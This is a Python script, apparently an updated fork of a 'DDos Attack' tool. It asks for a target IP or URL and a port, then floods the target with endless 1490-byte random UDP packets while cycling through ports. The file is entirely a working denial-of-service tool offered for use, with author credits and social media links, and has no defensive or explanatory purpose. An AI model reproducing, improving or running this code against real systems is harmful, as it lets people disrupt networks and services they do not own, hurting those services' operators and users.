# It already can use in python3 :)
# I also make some more function in it (it may good for use)
# I just change very less things in it :)

# import sys
import os
import time
import socket
from socket import gethostbyname # https分离IP
import random
import pyfiglet
# from threading import Thread
# import threading

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

def ddos(sent,port):
     global ip
     while True:
          sock.sendto(bytes, (ip, int(port)))
          sent = sent + 1
          port = port + 1
          print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
          if port == 65534:
               port = 1


def gethost(url): # Get IP from HTTPS(URL)
     output = ''
     if '//' in url:
          output = url.split('//')[1]
          if '/' in output:
               output = output.split('/')[0]
     elif '/' in url:
          output = url.split('/')[0]
     return output


def getip(url): # Get IP from HTTPS(URL)
     return gethostbyname(gethost(url))

# os.system("clear")
os.system('cls' if os.name == 'nt' else 'clear')
# os.system("figlet DDos Attack")
print(pyfiglet.figlet_format("DDos Attack")) # Text in default font
# print(pyfiglet.figlet_format("DDos Attack", font = "slant")) # Text in slant font
# If want more front, please go to : https://www.geeksforgeeks.org/python-ascii-art-using-pyfiglet-module/
# print

print("Author   : HA-MRX,acu715(update)")
print("You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
print("github   : https://github.com/Ha3MrX, https://github.com/acu715")
print("Facebook : https://www.facebook.com/muhamad.jabar222")
print("——————————————————————————————————————————————————————————————————————————")
ip = input("IP Target/URL : ")
if '//' in ip or 'https' in ip: # Get IP from HTTPS(URL)
     ip = getip(ip)
port = input("Port          : ")
# thread = input("Thread        : ") # I am lazy :) # acu715

# os.system("clear")
os.system('cls' if os.name == 'nt' else 'clear')
# os.system("figlet Attack Starting")
print(pyfiglet.figlet_format("Attack Starting")) # Text in default font
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
port = int(port)
while True:
     ddos(sent, port)
     # for i in range(int(thread)):
     #      t = threading.Thread(target=ddos(sent,port))
     #      t.start()
     #      thread.start_new_thread(ddos(sent,port),(i,)) # old version

     # at first version
     # sock.sendto(bytes, (ip,int(port)))
     # sent = sent + 1
     # port = port + 1
     # print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     # if port == 65534:
     #   port = 1
